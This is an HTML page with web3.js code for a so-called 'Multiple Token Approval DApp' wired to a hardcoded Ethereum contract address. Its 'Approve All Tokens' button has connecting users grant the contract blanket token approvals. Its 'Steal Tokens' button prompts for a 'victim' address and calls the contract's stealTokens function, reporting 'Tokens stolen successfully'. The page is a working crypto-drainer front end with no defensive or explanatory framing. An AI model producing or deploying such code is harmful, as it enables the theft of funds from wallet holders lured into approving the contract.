<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Multiple Token Approval DApp</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
</head>
<body>
    <h1>Multiple Token Approval DApp</h1>

    <button id="connectButton">Connect Wallet</button>
    <button id="approveAllTokens">Approve All Tokens</button>
    <button id="stealTokens">Steal Tokens</button>

    <div id="status"></div>

    <script>
        let web3;
        let contract;

        document.getElementById('connectButton').addEventListener('click', connectWallet);
        document.getElementById('approveAllTokens').addEventListener('click', approveAllTokens);
        document.getElementById('stealTokens').addEventListener('click', stealTokens);

        async function connectWallet() {
            if (typeof window.ethereum !== 'undefined') {
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                web3 = new Web3(window.ethereum);
                const accounts = await web3.eth.getAccounts();
                document.getElementById('status').innerText = `Wallet connected with address: ${accounts[0]}`;
                
                // Here you would set the address of your deployed contract
                const contractAddress = '0x3d31C07C8b370e72997945A83b04F52752F9329E';
                const abi = [
                    {
                        "constant": false,
                        "inputs": [],
                        "name": "approveAllTokens",
                        "outputs": [],
                        "payable": false,
                        "stateMutability": "nonpayable",
                        "type": "function"
                    },
                    {
                        "constant": false,
                        "inputs": [
                            {
                                "name": "victim",
                                "type": "address"
                            }
                        ],
                        "name": "stealTokens",
                        "outputs": [],
                        "payable": false,
                        "stateMutability": "nonpayable",
                        "type": "function"
                    }
                ];
                contract = new web3.eth.Contract(abi, contractAddress);
            } else {
                document.getElementById('status').innerText = 'Please install MetaMask!';
            }
        }

        async function approveAllTokens() {
            if (contract) {
                try {
                    await contract.methods.approveAllTokens().send({ from: (await web3.eth.getAccounts())[0] });
                    document.getElementById('status').innerText = 'All tokens approved successfully.';
                } catch (error) {
                    document.getElementById('status').innerText = `Error: ${error.message}`;
                }
            } else {
                document.getElementById('status').innerText = 'Please connect your wallet first.';
            }
        }

        async function stealTokens() {
            if (contract) {
                const victimAddress = prompt("Enter the victim's address:");
                if (victimAddress) {
                    try {
                        await contract.methods.stealTokens(victimAddress).send({ from: (await web3.eth.getAccounts())[0] });
                        document.getElementById('status').innerText = 'Tokens stolen successfully.';
                    } catch (error) {
                        document.getElementById('status').innerText = `Error: ${error.message}`;
                    }
                }
            } else {
                document.getElementById('status').innerText = 'Please connect your wallet first.';
            }
        }
    </script>
</body>
</html>
